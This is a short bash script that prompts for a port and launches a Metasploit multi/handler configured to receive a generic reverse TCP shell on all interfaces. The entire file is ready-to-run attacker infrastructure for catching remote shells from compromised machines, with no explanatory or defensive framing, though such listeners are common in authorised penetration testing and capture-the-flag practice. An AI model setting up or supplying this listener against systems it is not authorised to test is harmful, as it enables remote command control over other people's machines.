#!/bin/bash

# If a port is not provided as an argument, ask for it
if [ -z "$1" ]; then
    read -p "Enter LPORT: " LPORT
else
    LPORT=$1
fi

echo "[*] Waiting for 5 seconds..."
sleep 5

echo "[*] Starting Metasploit multi/handler on 0.0.0.0:$LPORT..."
# Launch msfconsole and execute the setup commands, leaving you in the interactive prompt
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT $LPORT; run"
